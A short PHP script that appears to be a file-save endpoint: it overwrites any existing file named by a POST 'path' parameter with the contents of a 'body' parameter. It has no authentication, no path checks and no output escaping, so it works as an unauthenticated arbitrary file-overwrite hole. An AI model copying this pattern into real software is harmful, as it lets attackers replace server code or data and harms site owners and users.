<?php
if (isset($_POST["path"]) && $_POST["path"]) {
    if (isset($_POST["body"]) && $_POST["body"] != "") {
        $path = $_POST["path"];
        $body = $_POST["body"];
        if (file_exists($path)) {
            $fp = fopen($path, "w");
            fwrite($fp, $body);
            fclose($fp);
            http_response_code(200);
        } else {
            http_response_code(406);
            echo "<p>" . basename($path) . " is Not Found.</p>";
        }
    } else {
        http_response_code(400);
        echo '<p>Require Param "body"</p>';
    }
} else {
    http_response_code(400);
    echo '<p>Require Param "path"</p>';
}
